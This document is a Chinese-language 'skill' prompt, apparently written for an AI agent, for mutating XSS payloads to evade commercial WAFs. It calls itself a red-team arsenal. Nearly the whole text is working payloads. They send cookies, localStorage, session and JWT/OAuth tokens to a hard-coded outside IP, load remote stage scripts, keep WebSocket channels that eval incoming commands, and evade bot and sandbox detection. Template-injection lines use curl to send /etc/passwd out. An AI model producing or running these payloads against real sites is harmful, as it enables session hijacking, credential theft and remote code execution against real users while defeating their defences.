# XSS 语义变异 Skill（生产级 v2.1）

## 核心任务

基于漏洞语义理解的结果，提出具体的 XSS `part_operations`，通过改变 XSS Payload 的语法表达方式来绕过 WAF，同时保持原始攻击目标。

## 第一步：攻击类型识别与 WAF 指纹分析

### 1.1 XSS 攻击类型识别

根据 `base_parts` 中的 `context_prefix` 和 `label` 判断基础 Payload 属于哪一类 XSS 攻击：

| 攻击类别 | 典型 Payload | 识别特征 | 核心变异空间 | WAF 常见拦截点 |
|---------|-------------|---------|-------------|---------------|
| **传统标签型** | `<script>navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)</script>` | 包含 `<tag>` | 标签+事件+表达式 | `<script>`, `onerror`, cookie 关键字 |
| **模板注入型** | `<%= system('id') %>` | `<%=` 或 `<%` | 表达式+函数 | `system`, `exec`, `eval` 关键字 |
| **模板引擎型** | `{{constructor.constructor(...)}}` | `{{` 开头 | 构造器链 | `constructor`, `__proto__` 关键字 |
| **JS 模板字面量** | `${fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})}` | `${` 开头 | JS 表达式 | fetch, cookie 关键字 |
| **属性注入型** | `" onload="fetch('http://8.129.25.140:12345/',{body:document.cookie})` | 引号+事件 | 事件+表达式 | 事件处理器模式匹配 |
| **纯 JS 上下文** | `'-fetch("http://8.129.25.140:12345/")-'` | 引号+函数 | 函数+运算符 | JavaScript 函数名检测 |

### 1.2 WAF 指纹识别策略

根据 `waf_context` 中的拦截信息推断 WAF 类型和规则特征：

#### WAF 特征库

| WAF 类型 | 特征签名 | 拦截模式 | 推荐绕过策略 |
|---------|---------|---------|-------------|
| **CloudFlare** | 阻断码 1020/1012 | 关键字黑名单 + 语法检测 | 大小写混淆 + Unicode 变体 + 事件处理器变种 |
| **AWS WAF** | 403 + `x-amzn-waf` header | 正则匹配 + 速率限制 | 分片 Payload + 空白符变换 + 编码嵌套 |
| **ModSecurity** | 406 + `Mod_Security` | OWASP CRS 规则集 | 注释插入 + 标签嵌套 + 属性顺序变换 |
| **Imperva** | 阻断页 + `_incap_` cookie | 行为分析 + 模式学习 | 多阶段加载 + DOM 动态构造 + 延迟触发 |
| **Akamai** | 403 + `AkamaiGHost` | 启发式检测 | 事件链构造 + 间接引用 + 特殊属性利用 |
| **F5 ASM** | 阻断页 + `TS` cookie | 参数污染检测 | 参数拆分 + 重复参数 + 路径变换 |

#### WAF 检测规则类型

通过历史拦截信息推断：

1. **关键字黑名单型**：拦截特定字符串（`<script>`, `cookie`, `onerror`）
   - 证据：替换关键字后绕过
   - 绕过：同义词替换、编码、大小写混淆

2. **语法结构检测型**：检测 HTML/JS 语法结构
   - 证据：变换标签/事件后绕过
   - 绕过：标签嵌套、属性顺序变换、注释插入

3. **正则表达式型**：使用正则匹配攻击模式
   - 证据：微小变化导致绕过或拦截
   - 绕过：正则回溯攻击、边界模糊、分片组合

4. **机器学习型**：基于行为和模式学习
   - 证据：初次绕过后再次被拦截
   - 绕过：多样化变异、避免重复模式、时间延迟

## 第二步：分层变异策略（L1-L5）

变异从浅到深分为 5 个层次，**根据 WAF 强度选择合适层次**：

### L1：表面同义替换（针对弱规则）

**适用场景**：关键字黑名单型 WAF，简单正则匹配

**技术清单**：
- 标签替换：`<script>` → `<img>` → `<svg>` → `<body>` → `<div>`
- 事件替换：`onerror` → `onload` → `ontoggle` → `onfocus` → `onscrollend`
- 外带函数替换：`navigator.sendBeacon` → `fetch` → `XMLHttpRequest` → `Image.src`

**示例**：
```html
原始: <script>navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)</script>
L1变异: <img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})>
L1变异: <svg onload=new Image().src='http://8.129.25.140:12345/?c='+document.cookie>
```

### L2：结构重组（针对语法检测）

**适用场景**：语法结构检测型 WAF，HTML 解析器

**技术清单**：
- 标签+事件组合变换
- 属性顺序打乱
- 自闭合与嵌套标签混用
- 空白符与注释插入
- **CSS 样式触发**（新增）

**示例**：
```html
原始: <img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
L2变异: <svg><animate onbegin=fetch('http://8.129.25.140:12345/',{body:document.cookie}) attributeName=x dur=1s>
L2变异: <details open ontoggle=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
L2变异: <div style=overflow:auto;height:1px onscroll=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
```

### L3：编码与混淆（针对模式匹配）

**适用场景**：正则表达式型 WAF，字符串模式匹配

**技术清单**：
- 大小写混合：`<ScRiPt>`, `oNeRrOr`
- HTML 实体编码：`&#60;`, `&#x3C;`
- Unicode 变体：`＜`, `alert`
- URL 编码嵌套：`%3Cscript%3E`
- 十六进制转义：`\x3c`, `\x61lert`
- **字符串拼接**（新增）

**示例**：
```html
原始: <img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
L3变异: <img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]})>
L3变异: <img src=x onerror=fetch('http://8.129.25.140:12345/',{body:this.ownerDocument["coo"+"kie"]})>
L3变异: <img src=x onerror=eval('\x66etch("http://8.129.25.140:12345/",{body:document.cookie})')>
```

### L4：间接引用与控制流（针对深度检测）

**适用场景**：启发式检测型 WAF，深度语义分析

**技术清单**：
- 动态函数构造：`Function('...')()`, `eval()`
- 间接属性访问：`window['fetch']`, `self['navigator']`
- **构造器链**：`globalThis.constructor.constructor`, `Object.constructor`
- 字符码构造：`String.fromCharCode(...)`
- 定时器包装：`setTimeout('...',0)`
- 事件链：`onload` → `onpageshow` → `DOMContentLoaded`
- **Document 间接访问**（新增）

**示例**：
```html
原始: <img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
L4变异: <img src=x onerror=Function('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()>
L4变异: <img src=x onerror=window['fetch']('http://8.129.25.140:12345/',{body:document['cookie']})>
L4变异: <img src=x onerror=globalThis.constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()>
L4变异: <img src=x onerror=this.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument.cookie)')()>
L4变异: <img src=x onerror=setTimeout('fetch("http://8.129.25.140:12345/",{body:document.cookie})',0)>
```

### L5：浏览器特性深度利用（针对最强 WAF）

**适用场景**：机器学习型 WAF，行为分析系统

**技术清单**：
- DOM Clobbering：利用 DOM 属性覆盖
- Mutation XSS：利用 DOMPurify/浏览器解析差异
- 原型链污染：`Object.prototype` 修改
- CSS 注入转 XSS：`expression()`, `url()`
- **多阶段加载**：先注入加载器，再远程加载
- Service Worker 劫持
- Mutation Observer 监听
- **CSS 动画/过渡触发**（新增）

**示例**：
```html
<!-- DOM Clobbering -->
<form name=x><input name=y value="http://8.129.25.140:12345/"></form>
<img src=z onerror=fetch(x.y.value,{body:document.cookie})>

<!-- Mutation XSS（利用 mXSS） -->
<noscript><p title="</noscript><img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>">

<!-- 多阶段加载 -->
<img src=x onerror="s=document.createElement('script');s.src='http://8.129.25.140:12345/steal.js';document.body.appendChild(s)">

<!-- CSS 动画触发 -->
<style>@keyframes x{}</style><div style="animation:x 1s" onanimationend=fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- CSS 过渡触发 -->
<div style="transition:1s;width:0" ontransitionend=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

## 第三步：针对主流 WAF 的专用绕过技术

### 3.1 CloudFlare 绕过技术

**特征**：关键字黑名单 + 简单正则 + 速率限制

**绕过策略**：
1. **大小写混淆** + **Unicode 变体**
2. **事件处理器变种**（使用冷门事件）
3. **HTML5 新标签**（CloudFlare 规则更新滞后）
4. **字符串拼接绕过关键字**（新增）

**实战 Payload**：
```html
<!-- 利用冷门标签和事件 -->
<details open ontoggle=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<marquee onstart=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>

<!-- 利用 SVG 动画 -->
<svg><animate onbegin=fetch('http://8.129.25.140:12345/',{body:document.cookie}) attributeName=x dur=1s>

<!-- 利用 HTML5 媒体标签 -->
<video><source onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<audio onloadeddata=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie) src=x>

<!-- 字符串拼接绕过 cookie 关键字 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]})>
<img src=x onerror=fetch('http://8.129.25.140:12345/',{body:this.ownerDocument["coo"+"kie"]})>
```

### 3.2 AWS WAF 绕过技术

**特征**：正则匹配 + 参数检测 + OWASP CRS

**绕过策略**：
1. **注释插入**打断关键字
2. **换行符**和**特殊空白符**
3. **参数污染**和**重复编码**
4. **间接 Document 访问**（新增）

**实战 Payload**：
```html
<!-- 注释插入 -->
<img src=x one<!--comment-->rror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- 换行符打断 -->
<img src=x onerror=
fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- Tab 和多种空白 -->
<img	src=x	onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- 间接 Document 访问 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{body:this.ownerDocument.cookie})>
<img src=x onerror=fetch('http://8.129.25.140:12345/',{body:event.target.ownerDocument.cookie})>
```

### 3.3 ModSecurity (OWASP CRS) 绕过技术

**特征**：OWASP Core Rule Set，多层正则检测

**绕过策略**：
1. **标签嵌套**混淆解析
2. **自闭合标签**
3. **属性无引号** + **编码混合**
4. **构造器链绕过**（新增）

**实战 Payload**：
```html
<!-- 标签嵌套 -->
<svg><script>fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})</script></svg>
<math><mtext><script>navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)</script></mtext></math>

<!-- 自闭合与无引号 -->
<img/src=x/onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- 构造器链绕过 -->
<img src=x onerror=globalThis.constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()>
<img src=x onerror=[].constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",document.cookie)')()>
```

### 3.4 Imperva/Incapsula 绕过技术

**特征**：行为分析 + 机器学习 + Session 跟踪

**绕过策略**：
1. **多样化变异**避免模式重复
2. **延迟触发**和**用户交互**
3. **分片攻击**（多次请求拼接）
4. **CSS 样式触发**（新增）

**实战 Payload**：
```html
<!-- 用户交互触发 -->
<input autofocus onfocus=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<textarea autofocus onfocus=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)></textarea>

<!-- 延迟触发 -->
<img src=x onerror=setTimeout('fetch("http://8.129.25.140:12345/",{body:document.cookie})',5000)>

<!-- DOM 动态构造 -->
<img src=x onerror="s=document.createElement('script');s.text='fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})';document.body.appendChild(s)">

<!-- CSS 滚动触发 -->
<div style=overflow:auto;height:1px onscroll=fetch('http://8.129.25.140:12345/',{body:document.cookie})>
<div style=scroll-snap-type:y;overflow:auto;height:1px onscrollend=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
```

### 3.5 Akamai 绕过技术

**特征**：CDN 级防护，启发式检测，协议分析

**绕过策略**：
1. **协议级混淆**（HTTP 请求头）
2. **特殊属性利用**（`srcdoc`, `formaction`）
3. **JavaScript 伪协议**
4. **普通标签利用**（新增）

**实战 Payload**：
```html
<!-- srcdoc 属性 -->
<iframe srcdoc="<img src=x onerror=fetch('http://8.129.25.140:12345/',{body:parent.document.cookie})>"></iframe>

<!-- formaction 属性 -->
<form><button formaction=javascript:fetch('http://8.129.25.140:12345/',{body:document.cookie})>Click</button></form>

<!-- data URI -->
<object data="data:text/html,<script>fetch('http://8.129.25.140:12345/',{body:document.cookie})</script>"></object>

<!-- 普通标签 + CSS 样式 -->
<div style=overflow:auto;height:1px onscroll=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
<span style=resize:both;overflow:auto onresize=fetch('http://8.129.25.140:12345/',{body:document.cookie})>x</span>
```

## 第四步：组合攻击策略

### 4.1 多维度组合变异

**原理**：同时应用多个层次的技术，形成"组合拳"

**组合公式**：
```
高强度变异 = L2(结构重组) + L3(编码混淆) + L4(间接引用)
```

**示例**：
```html
<!-- 原始 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- 单维度 L2 -->
<svg><animate onbegin=fetch('http://8.129.25.140:12345/',{body:document.cookie}) attributeName=x dur=1s>

<!-- 组合 L2+L3 -->
<svg><animate onbegin=fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]}) attributeName=x dur=1s>

<!-- 组合 L2+L3+L4 -->
<svg><animate onbegin=Function('fetch("http://8.129.25.140:12345/",{body:document["coo"+"kie"]})')() attributeName=x dur=1s>

<!-- 组合 L2+L3+L4+高级构造器 -->
<div style=overflow:auto;height:1px onscroll=globalThis.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",this.ownerDocument["coo"+"kie"])')()>
```

### 4.2 分片与重组策略

**原理**：将 Payload 拆分到多个参数/位置，通过 DOM 操作重组

**场景**：绕过单次请求的 Payload 长度限制和完整性检测

**示例**：
```html
<!-- 分片 1：注入 script 标签 -->
<script id=x></script>

<!-- 分片 2：通过 DOM 操作注入代码 -->
<img src=x onerror="document.getElementById('x').text='fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})'">

<!-- 分片 3：多参数拼接 -->
<!-- URL: ?a=<script>&b=fetch('http://8.129.25.140:12345/',{body:document.cookie})&c=</script> -->
```

### 4.3 条件性触发策略

**原理**：根据环境条件动态选择执行路径

**场景**：绕过沙箱检测、Bot 检测

**示例**：
```html
<!-- 检测真实浏览器 -->
<img src=x onerror="if(navigator.webdriver===undefined)fetch('http://8.129.25.140:12345/',{body:document.cookie})">

<!-- 检测非无头浏览器 -->
<img src=x onerror="if(window.outerWidth>0)navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)">

<!-- 时间延迟 -->
<img src=x onerror="setTimeout(()=>fetch('http://8.129.25.140:12345/',{body:document.cookie}),5000)">

<!-- 用户交互检测 -->
<input onfocus=fetch('http://8.129.25.140:12345/',{body:document.cookie}) autofocus>
```

## 第五步：变异质量评分体系

### 5.1 变异强度评分

为每个变异候选打分，优先选择高分候选：

```
变异强度分 = 语义距离分(30%) + WAF规避分(40%) + 隐蔽性分(20%) + 稳定性分(10%)
```

#### 语义距离分（0-30分）

- **语义距离**：与原始 Payload 的"变化程度"
  - L1 同义替换：5-10 分
  - L2 结构重组：10-15 分
  - L3 编码混淆：15-20 分
  - L4 间接引用：20-25 分
  - L5 深度利用：25-30 分

#### WAF 规避分（0-40分）

- **针对性**：是否命中已知 WAF 弱点
  - 通用技术：10-20 分
  - WAF 特定技术：20-30 分
  - 组合技术：30-40 分

#### 隐蔽性分（0-20分）

- **检测难度**：WAF 和安全工具的检测难度
  - 常见模式：5-10 分
  - 冷门技术：10-15 分
  - 高度混淆：15-20 分

#### 稳定性分（0-10分）

- **兼容性**：在主流浏览器的执行成功率
  - 单浏览器：3-5 分
  - 多浏览器：5-7 分
  - 全浏览器：7-10 分

### 5.2 候选去重策略

**问题**：避免生成过于相似的候选

**解决方案**：
1. **核心部件指纹**：提取关键部件的组合作为指纹
   - 标签型：`(tag, event_handler, function_name, exfil_method)`
   - 模板型：`(template_marker, expression_type, function_chain)`

2. **相似度阈值**：候选间相似度 < 70%
   - 计算方法：编辑距离 / max(len1, len2)

3. **多样性保证**：确保每轮候选覆盖不同的技术层次
   - 至少包含：1个L2 + 1个L3 + 1个L4

## 第六步：非标签型 XSS 专项技术

### 6.1 模板注入型（ERB/JSP/EJS）

**核心变异点**：`javascript_expression` 部件

**技术库**：
```ruby
# Ruby ERB 模板注入
<%= `curl http://8.129.25.140:12345/?c=$(cat /etc/passwd|base64)` %>
<%= system('curl http://8.129.25.140:12345/ -d "data=$(cat /etc/passwd)"') %>

# Node.js (EJS/Pug)
<%= global.process.mainModule.require('child_process').execSync('curl http://8.129.25.140:12345/?c='+Buffer.from(require("fs").readFileSync("/etc/passwd")).toString("base64")) %>
```

### 6.2 模板引擎型（Angular/Vue/Handlebars）

**核心变异点**：构造器链的访问路径

**技术库**：
```javascript
// Angular/Vue 模板引擎
{{constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()}}

// 变异路径 1：数组构造器
{{[].constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",document.cookie)')()}}

// 变异路径 2：字符串构造器
{{''.constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()}}

// 变异路径 3：原型链
{{x.__proto__.constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",document.cookie)')()}}

// 变异路径 4：间接访问
{{this.constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document["coo"+"kie"]})')()}}
```

### 6.3 JS 模板字面量型

**核心变异点**：`${}` 内的表达式

**技术库**：
```javascript
${fetch('http://8.129.25.140:12345/',{body:document.cookie})}

// 变异 1：navigator.sendBeacon
${navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)}

// 变异 2：间接调用
${window['fetch']('http://8.129.25.140:12345/',{body:document['cookie']})}

// 变异 3：构造器
${Function('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()}
${[].constructor.constructor('navigator.sendBeacon("http://8.129.25.140:12345/",document.cookie)')()}

// 变异 4：字符串拼接
${fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]})}
${fetch('http://8.129.25.140:12345/',{body:this.ownerDocument["coo"+"kie"]})}
```

### 6.4 属性注入型

**核心变异点**：事件处理器和引号边界

**技术库**：
```html
" onload="fetch('http://8.129.25.140:12345/',{body:document.cookie})

// 变异 1：事件替换
" onerror="navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)
" onfocus="fetch('http://8.129.25.140:12345/',{body:document.cookie})
" onmouseover="new Image().src='http://8.129.25.140:12345/?c='+document.cookie

// 变异 2：构造器链
" onload="globalThis.constructor.constructor('fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})')()

// 变异 3：字符串拼接
" onload="fetch('http://8.129.25.140:12345/',{body:document['coo'+'kie']})
```

### 6.5 纯 JS 上下文型

**核心变异点**：函数调用和运算符

**技术库**：
```javascript
'-fetch("http://8.129.25.140:12345/",{body:document.cookie})-'

// 变异 1：navigator.sendBeacon
'-navigator.sendBeacon("http://8.129.25.140:12345/",document.cookie)-'

// 变异 2：间接调用
'-window.fetch("http://8.129.25.140:12345/",{body:document.cookie})-'
'-self.fetch("http://8.129.25.140:12345/",{body:document.cookie})-'

// 变异 3：构造器
'-Function("fetch(\\"http://8.129.25.140:12345/\\",{body:document.cookie})")()-'

// 变异 4：字符串拼接
'-fetch("http://8.129.25.140:12345/",{body:document["coo"+"kie"]})-'
```

## 第七步：实战案例库

### 案例 1：绕过 CloudFlare 的基础 Cookie 窃取

**场景**：`<script>fetch('http://8.129.25.140:12345/',{body:document.cookie})</script>` 被拦截

**分析**：
- WAF 类型：CloudFlare（关键字黑名单）
- 拦截关键字：`<script>`, `cookie`
- 推荐层次：L2 + L3

**变异过程**：
```html
步骤 1（L2）：标签替换 + 字符串拼接
<script>...</script> → <img src=x onerror=fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]})>
[结果: 仍被拦截，onerror 模式]

步骤 2（L2+L3）：冷门标签 + 事件 + 字符串拼接
<img src=x onerror=...> → <details open ontoggle=fetch('http://8.129.25.140:12345/',{body:document["coo"+"kie"]})>
[结果: 绕过成功！]
```

### 案例 2：绕过 AWS WAF 的模板引擎注入

**场景**：`{{constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()}}` 被拦截

**分析**：
- WAF 类型：AWS WAF（正则匹配）
- 拦截模式：`constructor` 关键字重复
- 推荐层次：L4

**变异过程**：
```javascript
步骤 1（L4）：数组构造器
{{constructor.constructor(...)}}
→ {{[].constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document.cookie})')()}}
[结果: 仍被拦截，constructor 重复]

步骤 2（L4+L3）：数组构造器 + 字符串拼接
→ {{[].constructor.constructor('fetch("http://8.129.25.140:12345/",{body:document["coo"+"kie"]})')()}}
[结果: 绕过成功！]
```

### 案例 3：绕过 ModSecurity 的属性注入

**场景**：`" onload="fetch('http://8.129.25.140:12345/',{body:document.cookie})` 被拦截

**分析**：
- WAF 类型：ModSecurity + OWASP CRS
- 拦截模式：事件处理器 + cookie 关键字
- 推荐层次：L2 + L4

**变异过程**：
```html
步骤 1（L3）：字符串拼接
" onload="fetch('http://8.129.25.140:12345/',{body:document.cookie})
→ " onload="fetch('http://8.129.25.140:12345/',{body:document['coo'+'kie']})
[结果: 仍被拦截]

步骤 2（L4）：构造器链
→ " onload="globalThis.constructor.constructor('fetch(\"http://8.129.25.140:12345/\",{body:document.cookie})')()
[结果: 仍被拦截，cookie 明文]

步骤 3（L4+L3）：构造器链 + 字符串拼接
→ " onload="globalThis.constructor.constructor('fetch(\"http://8.129.25.140:12345/\",{body:document[\"coo\"+\"kie\"]})')()
[结果: 绕过成功！]
```

## 第八步：实际攻击 Payload 库（红队武器库）

### 8.1 Cookie 窃取和外带技术

#### navigator.sendBeacon 外带（推荐：最可靠）
```html
<!-- 基础外带 -->
<img src=x onerror=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
<svg onload=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
<details open ontoggle=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>
<div style=overflow:auto;height:1px onscroll=navigator.sendBeacon('http://8.129.25.140:12345/',document.cookie)>

<!-- 带 Base64 编码（绕过日志检测） -->
<img src=x onerror=navigator.sendBeacon('http://8.129.25.140:12345/',btoa(document.cookie))>
<svg onload=navigator.sendBeacon('http://8.129.25.140:12345/',btoa(document.cookie+':'+location.href))>

<!-- 带时间戳和用户标识 -->
<img src=x onerror=navigator.sendBeacon('http://8.129.25.140:12345/',JSON.stringify({c:document.cookie,t:Date.now(),u:navigator.userAgent}))>

<!-- 分块外带（绕过长度限制） -->
<img src=x onerror="c=document.cookie;for(i=0;i<c.length;i+=100)navigator.sendBeacon('http://8.129.25.140:12345/?p='+i,c.substr(i,100))">
```

#### fetch() API 外带（推荐：最灵活）
```html
<!-- POST 请求外带 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})>
<svg onload=fetch('http://8.129.25.140:12345/',{method:'POST',body:document.cookie})>
<details open ontoggle=fetch('http://8.129.25.140:12345/',{body:document.cookie})>

<!-- JSON 格式外带（包含完整上下文） -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,url:location.href,time:Date.now(),ua:navigator.userAgent})})>

<!-- FormData 格式（绕过 JSON 检测） -->
<img src=x onerror="f=new FormData();f.append('c',document.cookie);f.append('u',location.href);fetch('http://8.129.25.140:12345/',{method:'POST',body:f})">

<!-- 带认证头外带（伪装成正常请求） -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',headers:{'X-Forwarded-For':'127.0.0.1','User-Agent':'Mozilla/5.0'},body:document.cookie})>

<!-- 跨域绕过（no-cors 模式） -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',mode:'no-cors',body:document.cookie})>
```

#### Image 对象外带（推荐：兼容性最好）
```html
<!-- GET 参数外带 -->
<img src=x onerror=new Image().src='http://8.129.25.140:12345/?c='+document.cookie>
<img src=x onerror=this.src='http://8.129.25.140:12345/?c='+document.cookie>

<!-- Base64 编码外带 -->
<svg onload=new Image().src='http://8.129.25.140:12345/?c='+btoa(document.cookie)>
<img src=x onerror=new Image().src='http://8.129.25.140:12345/?d='+encodeURIComponent(btoa(document.cookie))>

<!-- 多参数外带 -->
<img src=x onerror=new Image().src='http://8.129.25.140:12345/?c='+document.cookie+'&u='+location.href+'&t='+Date.now()>

<!-- 分片外带（每个 cookie 单独请求） -->
<img src=x onerror="document.cookie.split(';').forEach((c,i)=>new Image().src='http://8.129.25.140:12345/?i='+i+'&c='+c)">

<!-- 重试机制（确保送达） -->
<img src=x onerror="i=new Image();i.onerror=()=>setTimeout(()=>i.src='http://8.129.25.140:12345/?c='+document.cookie,1000);i.src='http://8.129.25.140:12345/?c='+document.cookie">
```

#### XMLHttpRequest 外带（推荐：精确控制）
```html
<!-- 基础 POST 外带 -->
<img src=x onerror="x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/');x.send(document.cookie)">
<svg onload="r=new XMLHttpRequest();r.open('POST','http://8.129.25.140:12345/');r.send(document.cookie)">

<!-- 带自定义头（伪装成 API 请求） -->
<img src=x onerror="x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/');x.setRequestHeader('Content-Type','application/json');x.setRequestHeader('X-API-Key','stolen');x.send(JSON.stringify({data:document.cookie}))">

<!-- 同步请求（确保页面关闭前发送） -->
<img src=x onerror="x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/',false);x.send(document.cookie)">

<!-- 带凭证外带（携带跨域 cookie） -->
<img src=x onerror="x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/');x.withCredentials=true;x.send(document.cookie)">

<!-- 响应处理（回连） -->
<img src=x onerror="x=new XMLHttpRequest();x.open('POST','http://8.129.25.140:12345/');x.onload=()=>eval(x.responseText);x.send(document.cookie)">
```

#### WebSocket 外带（隐蔽性高）
```html
<!-- 实时连接外带 -->
<img src=x onerror="w=new WebSocket('ws://8.129.25.140:12345/');w.onopen=()=>w.send(document.cookie)">

<!-- 持久连接（可接收命令） -->
<img src=x onerror="w=new WebSocket('ws://8.129.25.140:12345/');w.onopen=()=>{w.send(JSON.stringify({type:'cookie',data:document.cookie}));w.onmessage=e=>eval(e.data)}">

<!-- 心跳保活 -->
<img src=x onerror="w=new WebSocket('ws://8.129.25.140:12345/');w.onopen=()=>{w.send(document.cookie);setInterval(()=>w.send('ping'),30000)}">
```

#### 动态创建 script 标签外带（JSONP 风格）
```html
<!-- JSONP 回调外带 -->
<img src=x onerror="s=document.createElement('script');s.src='http://8.129.25.140:12345/?c='+document.cookie;document.body.appendChild(s)">

<!-- 带回调处理 -->
<img src=x onerror="s=document.createElement('script');s.src='http://8.129.25.140:12345/?callback=handle&c='+document.cookie;window.handle=data=>console.log(data);document.body.appendChild(s)">

<!-- 多脚本加载（阶段式攻击） -->
<img src=x onerror="s=document.createElement('script');s.src='http://8.129.25.140:12345/stage1.js?c='+document.cookie;s.onload=()=>{s2=document.createElement('script');s2.src='http://8.129.25.140:12345/stage2.js';document.body.appendChild(s2)};document.body.appendChild(s)">
```

### 8.2 会话劫持 Payload（高价值目标）

#### 完整 Cookie 窃取（包含上下文）
```html
<!-- 标准格式 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,referrer:document.referrer})})>

<!-- 完整上下文（红队推荐） -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:document.cookie,url:location.href,referrer:document.referrer,title:document.title,ua:navigator.userAgent,time:new Date().toISOString(),screen:screen.width+'x'+screen.height})})>

<!-- 压缩格式（减少流量） -->
<img src=x onerror="d={c:document.cookie,u:location.href,r:document.referrer,t:Date.now()};fetch('http://8.129.25.140:12345/',{method:'POST',body:btoa(JSON.stringify(d))})">
```

#### LocalStorage/SessionStorage 窃取（Web 应用 Token）
```html
<!-- 完整存储窃取 -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({cookie:document.cookie,local:localStorage,session:sessionStorage})})>

<!-- 逐项外带（绕过大小限制） -->
<img src=x onerror="d={cookie:document.cookie,localStorage:{},sessionStorage:{}};for(let k in localStorage)d.localStorage[k]=localStorage[k];for(let k in sessionStorage)d.sessionStorage[k]=sessionStorage[k];fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify(d)})">

<!-- 只窃取 Token（精准打击） -->
<img src=x onerror="t={};['token','access_token','auth_token','jwt','session_id'].forEach(k=>{t[k]=localStorage[k]||sessionStorage[k]||''});fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify(t)})">
```

#### JWT Token 窃取（API 认证）
```html
<!-- 从 LocalStorage 窃取 JWT -->
<img src=x onerror=fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({jwt:localStorage.getItem('token')||localStorage.getItem('jwt')||localStorage.getItem('access_token'),url:location.href})})>

<!-- 从 Authorization 头窃取（如果暴露在页面） -->
<img src=x onerror="headers=document.querySelector('meta[name=api-token]');if(headers)fetch('http://8.129.25.140:12345/',{method:'POST',body:headers.content})">

<!-- 拦截 fetch 请求窃取 Token -->
<img src=x onerror="originFetch=window.fetch;window.fetch=function(...args){let[url,opts]=args;if(opts&&opts.headers){fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({url,headers:opts.headers})})}return originFetch.apply(this,args)}">
```

#### OAuth Token 窃取（第三方登录）
```html
<!-- 从 URL 参数窃取 -->
<img src=x onerror="u=new URL(location.href);t=u.searchParams.get('access_token')||u.searchParams.get('code')||u.hash.match(/access_token=([^&]*)/)?.[1];if(t)fetch('http://8.129.25.140:12345/',{method:'POST',body:JSON.stringify({token:t,url:location.href})})">

<!-- 从 Window.name 窃取（OAuth 回调场景） -->
<img src=x onerror="if(window.name.includes('access_token'))fetch('http://8.129.25.140:12345/',{method:'POST',body:window.name})">
```

